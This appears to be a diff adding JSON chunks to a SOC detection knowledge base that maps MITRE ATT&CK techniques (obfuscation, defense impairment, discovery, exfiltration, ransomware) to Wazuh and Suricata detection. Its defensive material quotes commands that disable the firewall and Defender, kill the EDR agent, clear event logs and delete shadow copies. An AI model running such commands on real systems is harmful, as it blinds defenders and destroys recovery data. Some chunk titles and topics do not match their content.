+    "text": "## SOC Evidence\n- Command line arguments containing heavily randomized characters, long base64 strings, or repeated use of string manipulation functions (e.g., `.Replace()`, `[char]`).\n- Antivirus alerts indicating a \"packed\" or \"obfuscated\" file.\n- Execution of known packing tools or utilities like `certutil.exe -decode`.",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1027",
+      "T1140",
+      "T1059",
+      "T1562",
+      "T1489",
+      "T1070"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "defense_evasion_t1027_t1562.md",
+    "chunk_id": "mitre-defense_evasion_t1027_t1562-chunk-4",
+    "title": "Obfuscated/Compressed Files and Information",
+    "text": "## Detection Clues\nLook for excessively long command lines or PowerShell scripts bypassing execution policies while utilizing Base64 (`-enc`). Monitor for the decoding of files via native binaries (LOLBins) like `certutil`.",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1027",
+      "T1140",
+      "T1059",
+      "T1562",
+      "T1489",
+      "T1070"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "defense_evasion_t1027_t1562.md",
+    "chunk_id": "mitre-defense_evasion_t1027_t1562-chunk-5",
+    "title": "Obfuscated/Compressed Files and Information",
+    "text": "## Related Techniques\n- T1140: Deobfuscate/Decode Files or Information\n- T1059: Command and Scripting Interpreter",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1027",
+      "T1140",
+      "T1059",
+      "T1562",
+      "T1489",
+      "T1070"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "defense_evasion_t1027_t1562.md",
+    "chunk_id": "mitre-defense_evasion_t1027_t1562-chunk-6",
+    "title": "Obfuscated/Compressed Files and Information",
+    "text": "## Example Alert Context\nA Wazuh alert triggers on a Sysmon Event ID 1 for `powershell.exe` with a 4,000-character command line consisting entirely of Base64 encoded text starting with `JAB` (often decoding to `$`).",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1027",
+      "T1140",
+      "T1059",
+      "T1562",
+      "T1489",
+      "T1070"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "defense_evasion_t1027_t1562.md",
+    "chunk_id": "mitre-defense_evasion_t1027_t1562-chunk-7",
+    "title": "Obfuscated/Compressed Files and Information",
+    "text": "## Wazuh Relevance\nWazuh relies on Sysmon or Windows Event logs to capture the command line parameters. Rules can be configured to alert on extremely long command lines or the presence of common obfuscation patterns (`-EncodedCommand`).",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1027",
+      "T1140",
+      "T1059",
+      "T1562",
+      "T1489",
+      "T1070"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "defense_evasion_t1027_t1562.md",
+    "chunk_id": "mitre-defense_evasion_t1027_t1562-chunk-8",
+    "title": "Obfuscated/Compressed Files and Information",
+    "text": "## Suricata Relevance\nSuricata can detect obfuscated or compressed payloads transmitted over the network by inspecting file signatures in HTTP/SMB streams or identifying known XOR/Base64 patterns in C2 traffic.",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1027",
+      "T1140",
+      "T1059",
+      "T1562",
+      "T1489",
+      "T1070"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "defense_evasion_t1027_t1562.md",
+    "chunk_id": "mitre-defense_evasion_t1027_t1562-chunk-9",
+    "title": "Obfuscated/Compressed Files and Information",
+    "text": "## Investigation Guidance\nExtract the obfuscated string or packed binary. Use tools like CyberChef to decode Base64/XOR payloads or unpack binaries in a sandbox environment to reveal the true intent, indicators of compromise (IOCs), and C2 addresses.\n\n---",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1027",
+      "T1140",
+      "T1059",
+      "T1562",
+      "T1489",
+      "T1070"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "defense_evasion_t1027_t1562.md",
+    "chunk_id": "mitre-defense_evasion_t1027_t1562-chunk-10",
+    "title": "Obfuscated/Compressed Files and Information",
+    "text": "# Impair Defenses\n\n**Technique ID:** T1562\n**Tactic:** Defense Evasion",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1027",
+      "T1140",
+      "T1059",
+      "T1562",
+      "T1489",
+      "T1070"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "defense_evasion_t1027_t1562.md",
+    "chunk_id": "mitre-defense_evasion_t1027_t1562-chunk-11",
+    "title": "Obfuscated/Compressed Files and Information",
+    "text": "## Description\nAdversaries may maliciously modify components of a victim environment to hinder or disable defensive mechanisms. This includes disabling antivirus, terminating security software processes, altering firewall rules, or modifying logging configurations.",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1027",
+      "T1140",
+      "T1059",
+      "T1562",
+      "T1489",
+      "T1070"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "defense_evasion_t1027_t1562.md",
+    "chunk_id": "mitre-defense_evasion_t1027_t1562-chunk-12",
+    "title": "Obfuscated/Compressed Files and Information",
+    "text": "## Attacker Behavior\nAttackers often use built-in administrative tools like `netsh` to disable the Windows Firewall, `Set-MpPreference` to disable Windows Defender, or `taskkill` to forcefully stop Endpoint Detection and Response (EDR) agents before dropping their primary payload.",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1027",
+      "T1140",
+      "T1059",
+      "T1562",
+      "T1489",
+      "T1070"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "defense_evasion_t1027_t1562.md",
+    "chunk_id": "mitre-defense_evasion_t1027_t1562-chunk-13",
+    "title": "Obfuscated/Compressed Files and Information",
+    "text": "## SOC Evidence\n- Execution of commands like `netsh advfirewall set allprofiles state off`.\n- PowerShell cmdlets such as `Set-MpPreference -DisableRealtimeMonitoring $true`.\n- Windows Security Event ID 1102 (The audit log was cleared).\n- Services related to security agents suddenly stopping or entering a failed state.",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1027",
+      "T1140",
+      "T1059",
+      "T1562",
+      "T1489",
+      "T1070"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "defense_evasion_t1027_t1562.md",
+    "chunk_id": "mitre-defense_evasion_t1027_t1562-chunk-14",
+    "title": "Obfuscated/Compressed Files and Information",
+    "text": "## Detection Clues\nMonitor for any command line execution attempting to interact with security software processes or firewall configurations. Alert on the clearance of Windows Event Logs, as this is almost exclusively a malicious or deeply suspicious administrative action.",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1027",
+      "T1140",
+      "T1059",
+      "T1562",
+      "T1489",
+      "T1070"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "defense_evasion_t1027_t1562.md",
+    "chunk_id": "mitre-defense_evasion_t1027_t1562-chunk-15",
+    "title": "Obfuscated/Compressed Files and Information",
+    "text": "## Related Techniques\n- T1489: Service Stop\n- T1070: Indicator Removal",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1027",
+      "T1140",
+      "T1059",
+      "T1562",
+      "T1489",
+      "T1070"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "defense_evasion_t1027_t1562.md",
+    "chunk_id": "mitre-defense_evasion_t1027_t1562-chunk-16",
+    "title": "Obfuscated/Compressed Files and Information",
+    "text": "## Example Alert Context\nAn alert is generated when an administrator account executes `taskkill /f /im sense.exe` to attempt to terminate Microsoft Defender for Endpoint, followed shortly by `wevtutil.exe cl System`.",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1027",
+      "T1140",
+      "T1059",
+      "T1562",
+      "T1489",
+      "T1070"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "defense_evasion_t1027_t1562.md",
+    "chunk_id": "mitre-defense_evasion_t1027_t1562-chunk-17",
+    "title": "Obfuscated/Compressed Files and Information",
+    "text": "## Wazuh Relevance\nWazuh has out-of-the-box rules to detect the clearing of event logs (Event ID 1102, 104) and can easily flag command lines that disable Windows Defender or firewall profiles. It can also alert if a monitored security service unexpectedly stops.",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1027",
+      "T1140",
+      "T1059",
+      "T1562",
+      "T1489",
+      "T1070"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "defense_evasion_t1027_t1562.md",
+    "chunk_id": "mitre-defense_evasion_t1027_t1562-chunk-18",
+    "title": "Obfuscated/Compressed Files and Information",
+    "text": "## Suricata Relevance\nSuricata cannot detect endpoint defense impairment directly. It relies on the endpoint agent (Wazuh) to report these localized administrative actions.",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1027",
+      "T1140",
+      "T1059",
+      "T1562",
+      "T1489",
+      "T1070"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "defense_evasion_t1027_t1562.md",
+    "chunk_id": "mitre-defense_evasion_t1027_t1562-chunk-19",
+    "title": "Obfuscated/Compressed Files and Information",
+    "text": "## Investigation Guidance\nIf defenses are impaired, assume the endpoint is fully compromised. Immediately isolate the machine from the network. Investigate the time immediately preceding the impairment to identify the delivery mechanism or lateral movement technique used to gain the necessary privileges.",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1027",
+      "T1140",
+      "T1059",
+      "T1562",
+      "T1489",
+      "T1070"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "discovery_t1087_t1082.md",
+    "chunk_id": "mitre-discovery_t1087_t1082-chunk-0",
+    "title": "System Information Discovery",
+    "text": "# System Information Discovery\n\n**Technique ID:** T1082\n**Tactic:** Discovery",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1082",
+      "T1083",
+      "T1016",
+      "T1087",
+      "T1069",
+      "T1482"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "discovery_t1087_t1082.md",
+    "chunk_id": "mitre-discovery_t1087_t1082-chunk-1",
+    "title": "System Information Discovery",
+    "text": "## Description\nAdversaries may attempt to get detailed information about the operating system and hardware, including version, patches, architecture, and network configuration. This helps them tailor their payloads and choose appropriate exploits.",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1082",
+      "T1083",
+      "T1016",
+      "T1087",
+      "T1069",
+      "T1482"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "discovery_t1087_t1082.md",
+    "chunk_id": "mitre-discovery_t1087_t1082-chunk-2",
+    "title": "System Information Discovery",
+    "text": "## Attacker Behavior\nAttackers execute native commands like `systeminfo`, `wmic os get`, or `uname -a` immediately after gaining initial access to profile the host.",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1082",
+      "T1083",
+      "T1016",
+      "T1087",
+      "T1069",
+      "T1482"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "discovery_t1087_t1082.md",
+    "chunk_id": "mitre-discovery_t1087_t1082-chunk-3",
+    "title": "System Information Discovery",
+    "text": "## SOC Evidence\n- Process creation events for `systeminfo.exe`, `hostname.exe`, `wmic.exe`.\n- Linux command execution for `uname`, `cat /etc/os-release`.\n- Scripts querying WMI classes like `Win32_OperatingSystem`.",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1082",
+      "T1083",
+      "T1016",
+      "T1087",
+      "T1069",
+      "T1482"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "discovery_t1087_t1082.md",
+    "chunk_id": "mitre-discovery_t1087_t1082-chunk-4",
+    "title": "System Information Discovery",
+    "text": "## Detection Clues\nLook for a rapid sequence of discovery commands executed in a short timeframe, often referred to as \"situational awareness\" commands. It's highly suspicious when these originate from a web server process or an Office application.",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1082",
+      "T1083",
+      "T1016",
+      "T1087",
+      "T1069",
+      "T1482"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "discovery_t1087_t1082.md",
+    "chunk_id": "mitre-discovery_t1087_t1082-chunk-5",
+    "title": "System Information Discovery",
+    "text": "## Related Techniques\n- T1083: File and Directory Discovery\n- T1016: System Network Configuration Discovery",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1082",
+      "T1083",
+      "T1016",
+      "T1087",
+      "T1069",
+      "T1482"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "discovery_t1087_t1082.md",
+    "chunk_id": "mitre-discovery_t1087_t1082-chunk-6",
+    "title": "System Information Discovery",
+    "text": "## Example Alert Context\nWazuh detects a sequence of commands executed within 5 seconds: `whoami`, `systeminfo`, `ipconfig /all`, and `netstat -ano`.",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1082",
+      "T1083",
+      "T1016",
+      "T1087",
+      "T1069",
+      "T1482"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "discovery_t1087_t1082.md",
+    "chunk_id": "mitre-discovery_t1087_t1082-chunk-7",
+    "title": "System Information Discovery",
+    "text": "## Wazuh Relevance\nWazuh natively captures process creation events (Event ID 4688 or Sysmon 1) and can correlate multiple discovery commands executed within a short time window.",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1082",
+      "T1083",
+      "T1016",
+      "T1087",
+      "T1069",
+      "T1482"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "discovery_t1087_t1082.md",
+    "chunk_id": "mitre-discovery_t1087_t1082-chunk-8",
+    "title": "System Information Discovery",
+    "text": "## Suricata Relevance\nSuricata may not see this locally executed discovery, but if the attacker uses an interactive C2 framework, the commands and their outputs might be transmitted across the network. If the channel is unencrypted, Suricata can inspect it.",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1082",
+      "T1083",
+      "T1016",
+      "T1087",
+      "T1069",
+      "T1482"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "discovery_t1087_t1082.md",
+    "chunk_id": "mitre-discovery_t1087_t1082-chunk-9",
+    "title": "System Information Discovery",
+    "text": "## Investigation Guidance\nAnalyze the parent process initiating the discovery commands. Determine how the attacker gained code execution on the host. Look for subsequent actions like lateral movement or payload downloads tailored to the discovered OS version.\n\n---",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1082",
+      "T1083",
+      "T1016",
+      "T1087",
+      "T1069",
+      "T1482"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "discovery_t1087_t1082.md",
+    "chunk_id": "mitre-discovery_t1087_t1082-chunk-10",
+    "title": "System Information Discovery",
+    "text": "# Account Discovery\n\n**Technique ID:** T1087\n**Tactic:** Discovery",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1082",
+      "T1083",
+      "T1016",
+      "T1087",
+      "T1069",
+      "T1482"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "discovery_t1087_t1082.md",
+    "chunk_id": "mitre-discovery_t1087_t1082-chunk-11",
+    "title": "System Information Discovery",
+    "text": "## Description\nAdversaries may attempt to get a listing of local system or domain accounts. This information helps them identify potential targets for credential dumping, brute-forcing, or lateral movement.",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1082",
+      "T1083",
+      "T1016",
+      "T1087",
+      "T1069",
+      "T1482"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "discovery_t1087_t1082.md",
+    "chunk_id": "mitre-discovery_t1087_t1082-chunk-12",
+    "title": "System Information Discovery",
+    "text": "## Attacker Behavior\nAttackers use commands like `net user`, `net localgroup administrators`, or PowerShell cmdlets like `Get-LocalUser` and `Get-ADUser` to enumerate accounts.",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1082",
+      "T1083",
+      "T1016",
+      "T1087",
+      "T1069",
+      "T1482"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "discovery_t1087_t1082.md",
+    "chunk_id": "mitre-discovery_t1087_t1082-chunk-13",
+    "title": "System Information Discovery",
+    "text": "## SOC Evidence\n- Execution of `net.exe` with `user` or `group` parameters.\n- LDAP queries originating from non-standard applications.\n- Use of BloodHound/SharpHound for aggressive Active Directory enumeration.",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1082",
+      "T1083",
+      "T1016",
+      "T1087",
+      "T1069",
+      "T1482"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "discovery_t1087_t1082.md",
+    "chunk_id": "mitre-discovery_t1087_t1082-chunk-14",
+    "title": "System Information Discovery",
+    "text": "## Detection Clues\nMonitor for repeated or broad LDAP queries against Domain Controllers. Alert on the execution of local account enumeration commands by non-administrative users.",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1082",
+      "T1083",
+      "T1016",
+      "T1087",
+      "T1069",
+      "T1482"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "discovery_t1087_t1082.md",
+    "chunk_id": "mitre-discovery_t1087_t1082-chunk-15",
+    "title": "System Information Discovery",
+    "text": "## Related Techniques\n- T1069: Permission Groups Discovery\n- T1482: Domain Trust Discovery",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1082",
+      "T1083",
+      "T1016",
+      "T1087",
+      "T1069",
+      "T1482"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "discovery_t1087_t1082.md",
+    "chunk_id": "mitre-discovery_t1087_t1082-chunk-16",
+    "title": "System Information Discovery",
+    "text": "## Example Alert Context\nA Wazuh alert triggers on the execution of `net group \"Domain Admins\" /domain`, a common command used by attackers to identify high-value targets.",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1082",
+      "T1083",
+      "T1016",
+      "T1087",
+      "T1069",
+      "T1482"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "discovery_t1087_t1082.md",
+    "chunk_id": "mitre-discovery_t1087_t1082-chunk-17",
+    "title": "System Information Discovery",
+    "text": "## Wazuh Relevance\nWazuh captures the execution of enumeration binaries. Rules are explicitly built to detect `net.exe` usage querying sensitive groups or domain accounts.",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1082",
+      "T1083",
+      "T1016",
+      "T1087",
+      "T1069",
+      "T1482"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "discovery_t1087_t1082.md",
+    "chunk_id": "mitre-discovery_t1087_t1082-chunk-18",
+    "title": "System Information Discovery",
+    "text": "## Suricata Relevance\nSuricata can detect anomalous LDAP traffic volumes associated with Active Directory enumeration tools like SharpHound.",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1082",
+      "T1083",
+      "T1016",
+      "T1087",
+      "T1069",
+      "T1482"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "discovery_t1087_t1082.md",
+    "chunk_id": "mitre-discovery_t1087_t1082-chunk-19",
+    "title": "System Information Discovery",
+    "text": "## Investigation Guidance\nDetermine which account executed the discovery commands. If it's a compromised standard user, investigate if the attacker attempted to pivot or dump credentials for the discovered administrative accounts.",
+    "topic": "Lateral Movement",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1082",
+      "T1083",
+      "T1016",
+      "T1087",
+      "T1069",
+      "T1482"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "exfiltration_impact_t1041_t1486.md",
+    "chunk_id": "mitre-exfiltration_impact_t1041_t1486-chunk-0",
+    "title": "Exfiltration Over C2 Channel",
+    "text": "# Exfiltration Over C2 Channel\n\n**Technique ID:** T1041\n**Tactic:** Exfiltration",
+    "topic": "Data Exfiltration",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1041",
+      "T1567",
+      "T1020",
+      "T1486",
+      "T1490",
+      "T1489"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "exfiltration_impact_t1041_t1486.md",
+    "chunk_id": "mitre-exfiltration_impact_t1041_t1486-chunk-1",
+    "title": "Exfiltration Over C2 Channel",
+    "text": "## Description\nAdversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.",
+    "topic": "Data Exfiltration",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1041",
+      "T1567",
+      "T1020",
+      "T1486",
+      "T1490",
+      "T1489"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "exfiltration_impact_t1041_t1486.md",
+    "chunk_id": "mitre-exfiltration_impact_t1041_t1486-chunk-2",
+    "title": "Exfiltration Over C2 Channel",
+    "text": "## Attacker Behavior\nAfter collecting sensitive documents, the attacker compresses and encrypts them into a single archive, then uses their established HTTPS beacon to POST the file to their C2 server.",
+    "topic": "Data Exfiltration",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1041",
+      "T1567",
+      "T1020",
+      "T1486",
+      "T1490",
+      "T1489"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "exfiltration_impact_t1041_t1486.md",
+    "chunk_id": "mitre-exfiltration_impact_t1041_t1486-chunk-3",
+    "title": "Exfiltration Over C2 Channel",
+    "text": "## SOC Evidence\n- Abnormally large outbound data transfers (e.g., hundreds of megabytes) over a connection that previously only exhibited small, periodic beaconing behavior.\n- Long-running network connections to external IP addresses.",
+    "topic": "Data Exfiltration",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1041",
+      "T1567",
+      "T1020",
+      "T1486",
+      "T1490",
+      "T1489"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "exfiltration_impact_t1041_t1486.md",
+    "chunk_id": "mitre-exfiltration_impact_t1041_t1486-chunk-4",
+    "title": "Exfiltration Over C2 Channel",
+    "text": "## Detection Clues\nMonitor network flow data (NetFlow) for significant anomalies in outbound traffic volume from workstations or internal servers.",
+    "topic": "Data Exfiltration",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1041",
+      "T1567",
+      "T1020",
+      "T1486",
+      "T1490",
+      "T1489"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "exfiltration_impact_t1041_t1486.md",
+    "chunk_id": "mitre-exfiltration_impact_t1041_t1486-chunk-5",
+    "title": "Exfiltration Over C2 Channel",
+    "text": "## Related Techniques\n- T1567: Exfiltration Over Web Service\n- T1020: Automated Exfiltration",
+    "topic": "Data Exfiltration",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1041",
+      "T1567",
+      "T1020",
+      "T1486",
+      "T1490",
+      "T1489"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "exfiltration_impact_t1041_t1486.md",
+    "chunk_id": "mitre-exfiltration_impact_t1041_t1486-chunk-6",
+    "title": "Exfiltration Over C2 Channel",
+    "text": "## Example Alert Context\nSuricata detects a massive outbound HTTPS flow (500MB) to an IP address previously flagged for suspicious HTTP beaconing, indicating likely data exfiltration.",
+    "topic": "Data Exfiltration",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1041",
+      "T1567",
+      "T1020",
+      "T1486",
+      "T1490",
+      "T1489"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "exfiltration_impact_t1041_t1486.md",
+    "chunk_id": "mitre-exfiltration_impact_t1041_t1486-chunk-7",
+    "title": "Exfiltration Over C2 Channel",
+    "text": "## Wazuh Relevance\nWazuh may not see the network volume, but it can detect the preceding steps: the execution of archiving tools (like `rar.exe` or `7z.exe`) and the reading of sensitive files.",
+    "topic": "Data Exfiltration",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1041",
+      "T1567",
+      "T1020",
+      "T1486",
+      "T1490",
+      "T1489"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "exfiltration_impact_t1041_t1486.md",
+    "chunk_id": "mitre-exfiltration_impact_t1041_t1486-chunk-8",
+    "title": "Exfiltration Over C2 Channel",
+    "text": "## Suricata Relevance\nSuricata and network flow monitors are critical for detecting the volume anomaly and identifying the destination of the exfiltrated data.",
+    "topic": "Data Exfiltration",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1041",
+      "T1567",
+      "T1020",
+      "T1486",
+      "T1490",
+      "T1489"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "exfiltration_impact_t1041_t1486.md",
+    "chunk_id": "mitre-exfiltration_impact_t1041_t1486-chunk-9",
+    "title": "Exfiltration Over C2 Channel",
+    "text": "## Investigation Guidance\nDetermine what data was accessed prior to the exfiltration event. Review file access logs and process execution history to understand the scope of the breach.\n\n---",
+    "topic": "Data Exfiltration",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1041",
+      "T1567",
+      "T1020",
+      "T1486",
+      "T1490",
+      "T1489"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "exfiltration_impact_t1041_t1486.md",
+    "chunk_id": "mitre-exfiltration_impact_t1041_t1486-chunk-10",
+    "title": "Exfiltration Over C2 Channel",
+    "text": "# Data Encrypted for Impact\n\n**Technique ID:** T1486\n**Tactic:** Impact",
+    "topic": "Data Exfiltration",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1041",
+      "T1567",
+      "T1020",
+      "T1486",
+      "T1490",
+      "T1489"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "exfiltration_impact_t1041_t1486.md",
+    "chunk_id": "mitre-exfiltration_impact_t1041_t1486-chunk-11",
+    "title": "Exfiltration Over C2 Channel",
+    "text": "## Description\nAdversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. This is the core technique of ransomware operations.",
+    "topic": "Data Exfiltration",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1041",
+      "T1567",
+      "T1020",
+      "T1486",
+      "T1490",
+      "T1489"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "exfiltration_impact_t1041_t1486.md",
+    "chunk_id": "mitre-exfiltration_impact_t1041_t1486-chunk-12",
+    "title": "Exfiltration Over C2 Channel",
+    "text": "## Attacker Behavior\nAttackers deploy ransomware executables that iterate through local and mapped network drives, encrypting files and appending a specific extension (e.g., `.encrypted`, `.locked`). A ransom note is typically dropped in each affected directory.",
+    "topic": "Data Exfiltration",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1041",
+      "T1567",
+      "T1020",
+      "T1486",
+      "T1490",
+      "T1489"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "exfiltration_impact_t1041_t1486.md",
+    "chunk_id": "mitre-exfiltration_impact_t1041_t1486-chunk-13",
+    "title": "Exfiltration Over C2 Channel",
+    "text": "## SOC Evidence\n- A massive spike in file modification and rename events across the file system.\n- Creation of files named `README_FOR_DECRYPT.txt` or similar.\n- High CPU utilization from unknown processes.\n- Execution of commands to delete Volume Shadow Copies (e.g., `vssadmin delete shadows /all /quiet`).",
+    "topic": "Data Exfiltration",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1041",
+      "T1567",
+      "T1020",
+      "T1486",
+      "T1490",
+      "T1489"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "exfiltration_impact_t1041_t1486.md",
+    "chunk_id": "mitre-exfiltration_impact_t1041_t1486-chunk-14",
+    "title": "Exfiltration Over C2 Channel",
+    "text": "## Detection Clues\nImplement File Integrity Monitoring (FIM) or ransomware tripwires (canary files). Alert immediately on the execution of commands that inhibit system recovery (like `vssadmin` or `bcdedit`).",
+    "topic": "Data Exfiltration",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1041",
+      "T1567",
+      "T1020",
+      "T1486",
+      "T1490",
+      "T1489"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "exfiltration_impact_t1041_t1486.md",
+    "chunk_id": "mitre-exfiltration_impact_t1041_t1486-chunk-15",
